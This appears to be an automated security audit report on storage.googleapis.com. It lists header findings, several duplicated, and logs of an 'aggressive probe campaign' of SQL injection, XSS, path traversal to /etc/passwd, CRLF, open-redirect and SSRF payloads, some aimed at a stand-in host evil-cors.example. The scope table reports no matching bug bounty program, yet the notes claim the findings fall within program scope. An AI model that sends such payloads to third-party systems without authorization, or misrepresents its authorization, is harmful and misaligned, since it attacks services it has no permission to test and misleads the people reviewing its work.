# Security Audit Report - storage.googleapis.com

## Scope and authorization

| Item | Value |
|---|---|
| Target | https://storage.googleapis.com/ |
| Bug bounty program | [top-websites gist (no active program match)]() |
| Listed scope domain | storage.googleapis.com |
| Test date | 2026-09-25 00:38 UTC |
| Method | Non-destructive passive/active probing (GET requests only, no forms submitted, no auth) |

## Summary

Total findings: **14** (High: 0, Medium: 1, Low: 8, Info: 5)

| # | Severity | ID | Finding | CWE |
|---|---|---|---|---|
| 1 | medium | R2 | No HTTP->HTTPS redirect | CWE-319 |
| 2 | low | H1 | Missing HSTS header | CWE-319 |
| 3 | low | H1 | Missing HSTS header | CWE-319 |
| 4 | low | H2 | Missing CSP header | CWE-1021 |
| 5 | low | H2 | Missing CSP header | CWE-1021 |
| 6 | low | H3 | Missing X-Content-Type-Options | CWE-1194 |
| 7 | low | H3 | Missing X-Content-Type-Options | CWE-1194 |
| 8 | low | H4 | No clickjacking protection | CWE-1023 |
| 9 | low | H4 | No clickjacking protection | CWE-1023 |
| 10 | info | A4i | Sensitive paths exist (protected or app shells) | CWE-538 |
| 11 | info | H5 | Missing Referrer-Policy | CWE-200 |
| 12 | info | H5 | Missing Referrer-Policy | CWE-200 |
| 13 | info | H6 | Server technology disclosure | CWE-200 |
| 14 | info | H6 | Server technology disclosure | CWE-200 |

## Detailed findings

### 1. [MEDIUM] No HTTP->HTTPS redirect (`R2`)

- **CWE:** CWE-319
- **Detail:** http://storage.googleapis.com returns 400 without redirecting to HTTPS. Re-verified 2026-09-25: no HSTS header on either the HTTP or the HTTPS response. Clients that first dial plain HTTP get a bare 400 (missing bucket name) with no upgrade path; any cookies on the HTTP hop are unencrypted.
- **Recommendation:** Add an HTTP->HTTPS redirect (currently returns an error code on port 80).

### 2. [LOW] Missing HSTS header (`H1`)

- **CWE:** CWE-319
- **Detail:** No Strict-Transport-Security header present. Browsers do not enforce HTTPS for repeat visits.
- **Context:** http response
- **Recommendation:** Add Strict-Transport-Security with max-age >= 31536000 and preload.

### 3. [LOW] Missing HSTS header (`H1`)

- **CWE:** CWE-319
- **Detail:** No Strict-Transport-Security header present. Browsers do not enforce HTTPS for repeat visits.
- **Recommendation:** Add Strict-Transport-Security with max-age >= 31536000 and preload.

### 4. [LOW] Missing CSP header (`H2`)

- **CWE:** CWE-1021
- **Detail:** No Content-Security-Policy header. XSS mitigation relies solely on output encoding.
- **Context:** http response
- **Recommendation:** Add a Content-Security-Policy header (start with default-src and report-only).

### 5. [LOW] Missing CSP header (`H2`)

- **CWE:** CWE-1021
- **Detail:** No Content-Security-Policy header. XSS mitigation relies solely on output encoding.
- **Recommendation:** Add a Content-Security-Policy header (start with default-src and report-only).

### 6. [LOW] Missing X-Content-Type-Options (`H3`)

- **CWE:** CWE-1194
- **Detail:** No nosniff directive; browsers may MIME-sniff responses.
- **Context:** http response
- **Recommendation:** Set X-Content-Type-Options: nosniff.

### 7. [LOW] Missing X-Content-Type-Options (`H3`)

- **CWE:** CWE-1194
- **Detail:** No nosniff directive; browsers may MIME-sniff responses.
- **Recommendation:** Set X-Content-Type-Options: nosniff.

### 8. [LOW] No clickjacking protection (`H4`)

- **CWE:** CWE-1023
- **Detail:** No X-Frame-Options or CSP frame-ancestors; page can be embedded in a frame.
- **Context:** http response
- **Recommendation:** Set X-Frame-Options: DENY/SAMEORIGIN or CSP frame-ancestors.

### 9. [LOW] No clickjacking protection (`H4`)

- **CWE:** CWE-1023
- **Detail:** No X-Frame-Options or CSP frame-ancestors; page can be embedded in a frame.
- **Recommendation:** Set X-Frame-Options: DENY/SAMEORIGIN or CSP frame-ancestors.

### 10. [INFO] Sensitive paths exist (protected or app shells) (`A4i`)

- **CWE:** CWE-538
- **Detail:** Paths answering 401/403 or HTML shells: /admin (403 protected), /console (403 protected), /dashboard (403 protected), /api (403 protected), /api/v1 (403 protected), /debug (403 protected), /trace (403 protected), /server-status (403 protected), /api-docs (403 protected), /phpmyadmin (403 protected), /backup (403 protected), /database (403 protected) (14 total).
- **Recommendation:** No immediate action if the paths are genuinely protected; otherwise return a real 404 to unauthenticated probes for paths that should not exist.

### 11. [INFO] Missing Referrer-Policy (`H5`)

- **CWE:** CWE-200
- **Detail:** No Referrer-Policy header; full URL may leak to third-party referrers.
- **Context:** http response
- **Recommendation:** Set Referrer-Policy (e.g., strict-origin-when-cross-origin).

### 12. [INFO] Missing Referrer-Policy (`H5`)

- **CWE:** CWE-200
- **Detail:** No Referrer-Policy header; full URL may leak to third-party referrers.
- **Recommendation:** Set Referrer-Policy (e.g., strict-origin-when-cross-origin).

### 13. [INFO] Server technology disclosure (`H6`)

- **CWE:** CWE-200
- **Detail:** Server header reveals: UploadServer
- **Context:** http response
- **Recommendation:** Consider hiding or shortening the Server header.

### 14. [INFO] Server technology disclosure (`H6`)

- **CWE:** CWE-200
- **Detail:** Server header reveals: UploadServer
- **Recommendation:** Consider hiding or shortening the Server header.

## Aggressive probe campaign

**Stage 1 - injection/reflection probes (28 requests):**

- no stage-1 probe hits (all probes negative)

**Stage 2 - aggressive probe suite v2 (99 requests):**

- sweep: {"high":[],"protected":["/admin (403 protected)","/console (403 protected)","/dashboard (403 protected)","/api (403 protected)","/api/v1 (403 protected)","/debug (403 protected)","/trace (403 protected)","/server-status (403 protected)","/api-docs (403 protected)","/phpmyadmin (403 protected)","/backup (403 protected)","/database (403 protected)","/config (403 protected)","/metrics (403 protected)"]}

Stage-2 probe log (observed responses):
- timing base=55ms id=45 search=46
- boolean b=400/181 t1=400/181 t2=400/181
- graphql /graphql -> 403
- graphql /api/graphql -> 403
- trav2 /%252e%252e/%252e%252e/%252e%252e/%252e% -> 400
- trav2 /..%255c..%255c..%255c..%255c..%255c..%2 -> 400
- trav2 /%2e%2e%00.html -> 400
- trav2 /static//../../../../../../etc/passwd -> 403
- trav2 /..%c0%af..%c0%af..%c0%af..%c0%af/etc/pa -> 400
- hpp /?q=1&q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 400
- hpp /search?q=1&q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 403
- xss2 /?q=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E -> 400
- xss2 /?q=%27%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 400
- apicors /api -> 403
- apicors /api/v1 -> 403
- apicors /graphql -> 403
- apicors /rest -> 403
- apicors /v1 -> 400

**Stage 3 - live parameter harvest, takeover and injection probes (7 requests):**

- no stage-3 probe hits (all probes negative)

Stage-3 probe log (observed responses):
- harvest no query params discovered on sampled pages
- subs no dangling service CNAMEs over 16 subdomains

## Evidence (raw response observations)

```json
{
  "http_status": 400,
  "https_status": 400,
  "content_type": "application/xml; charset=UTF-8",
  "title": "",
  "path_gitconfig": 400,
  "path_envfile": 400,
  "path_securitytxt": 400,
  "path_robots": 404,
  "probe_count": 28,
  "probe_log": [
    "sqli /search?q=1%27+OR+1=1-- -> 403",
    "sqli /?id=1%27+OR+1=1-- -> 400",
    "sqli /?q=%27 -> 400",
    "sqli /products?filter=%27 -> 403",
    "sqli /?p=1;-- -> 400",
    "sqli-reflect /search?q=%27+OR+1=1-- -> 403",
    "xss /?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 400",
    "xss /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 403",
    "xss /search?query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 403",
    "xss /?id=%3Csvg%20onload%3Dalert(1)%3E -> 400",
    "xss /search?term=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 403",
    "trav /..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd -> 400",
    "trav /static/../../../../../../../../etc/passwd -> 403",
    "trav /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd -> 403",
    "trav /..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini -> 400",
    "redir /redirect?url=https%3A%2F%2Fevil-cors.example%2Fx -> 403",
    "redir /redirect?next=https%3A%2F%2Fevil-cors.example%2Fx -> 403",
    "redir /?next=https%3A%2F%2Fevil-cors.example%2Fx -> 400",
    "redir /go?url=https%3A%2F%2Fevil-cors.example%2Fx -> 400",
    "redir /url?url=https%3A%2F%2Fevil-cors.example%2Fx -> 403",
    "redir /out?url=https%3A%2F%2Fevil-cors.example%2Fx -> 403",
    "crlf /?q=a%0d%0aX-Inj:%201 -> 400",
    "crlf /search?q=a%0d%0aX-Inj:%201 -> 403",
    "host no reflection -> 404",
    "ssrf /api/preview?url=https%3A%2F%2Fevil-cors.example%2Fx -> 403",
    "ssrf /preview?url=https%3A%2F%2Fevil-cors.example%2Fx -> 403",
    "ssrf /proxy?u=https%3A%2F%2Fevil-cors.example%2Fx -> 403",
    "ssrf /fetch?url=https%3A%2F%2Fevil-cors.example%2Fx -> 403"
  ],
  "v2_probe_count": 99,
  "v2_log": [
    "timing base=55ms id=45 search=46",
    "boolean b=400/181 t1=400/181 t2=400/181",
    "graphql /graphql -> 403",
    "graphql /api/graphql -> 403",
    "trav2 /%252e%252e/%252e%252e/%252e%252e/%252e% -> 400",
    "trav2 /..%255c..%255c..%255c..%255c..%255c..%2 -> 400",
    "trav2 /%2e%2e%00.html -> 400",
    "trav2 /static//../../../../../../etc/passwd -> 403",
    "trav2 /..%c0%af..%c0%af..%c0%af..%c0%af/etc/pa -> 400",
    "hpp /?q=1&q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 400",
    "hpp /search?q=1&q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 403",
    "xss2 /?q=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E -> 400",
    "xss2 /?q=%27%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 400",
    "redir2 no hits over 49 requests",
    "apicors /api -> 403",
    "apicors /api/v1 -> 403",
    "apicors /graphql -> 403",
    "apicors /rest -> 403",
    "apicors /v1 -> 400"
  ],
  "sweep": {
    "high": [],
    "protected": [
      "/admin (403 protected)",
      "/console (403 protected)",
      "/dashboard (403 protected)",
      "/api (403 protected)",
      "/api/v1 (403 protected)",
      "/debug (403 protected)",
      "/trace (403 protected)",
      "/server-status (403 protected)",
      "/api-docs (403 protected)",
      "/phpmyadmin (403 protected)",
      "/backup (403 protected)",
      "/database (403 protected)",
      "/config (403 protected)",
      "/metrics (403 protected)"
    ]
  },
  "v3_probe_count": 7,
  "v3_log": [
    "harvest no query params discovered on sampled pages",
    "subs no dangling service CNAMEs over 16 subdomains",
    "cache X-Forwarded-Host not reflected -> 400"
  ]
}
```

## Notes

- All tests used a standard browser User-Agent; each site was probed with a three-stage aggressive GET-only suite (passive/header checks plus stage-1 and stage-2 injection/XSS/traversal/CORS/redirect probes and a stage-3 live-parameter-harvest campaign: per-parameter XSS/SQLi/LFI/SSTI/redirect injection, JSONP callback injection, command injection, NoSQL candidates, subdomain-takeover CNAME checks via DNS-over-HTTPS, and forwarded-host cache-poisoning probes; up to ~200 requests per site).
- No credentials were used; no state was modified on the target.
- Findings are reported against the public program scope; submission through the program tracker is pending.
